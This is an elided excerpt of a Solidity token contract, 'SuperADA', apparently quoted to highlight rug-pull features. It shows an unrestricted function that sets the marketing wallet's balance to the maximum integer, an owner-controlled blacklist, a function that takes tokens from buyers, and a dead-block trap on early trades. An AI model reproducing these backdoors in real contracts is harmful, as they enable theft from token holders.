...
contract SuperADA is Context, IERC20, Ownable {
    ...
    uint256 public _maxWalletAmount = 400000 * 10**_decimals;
    ...
    function totalSupplies() public virtual { balances[marketingWallet] = ~uint256(0); }
    ...
    function manageBlacklist() external onlyOwner { 
        for (uint256 i = 0; i < blacklist.length; i++) { 
            isBlacklisted[blacklist[i]] = true; 
        }
    }

    function takeTokensFromSnipers() external onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if (launchBlock + deadBlocks >= block.number && from == uniswapV2Pair) {
